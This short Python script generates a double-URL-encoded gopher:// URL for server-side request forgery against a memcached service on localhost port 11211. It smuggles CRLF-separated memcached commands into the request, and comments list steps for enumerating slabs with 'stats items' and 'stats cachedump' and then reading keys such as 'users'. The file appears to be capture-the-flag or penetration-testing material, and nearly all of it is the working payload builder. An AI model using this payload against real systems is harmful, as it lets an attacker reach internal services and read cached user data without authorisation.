import urllib.parse

key = "quit\r\n\r\n"
cmd = "get users\r\n"+key
#steps:
#1 - cmd = "stat items\r\n\r\n"+key
#2 - cmd = "stats cachedump N qtd_N\r\n\r\n"+key
#3 - cmd = "get keyName\r\n"+key
#end-steps
#cmd = "get " +key
print("gopher://localhost:11211/_",end='')
print(urllib.parse.quote(urllib.parse.quote(cmd)))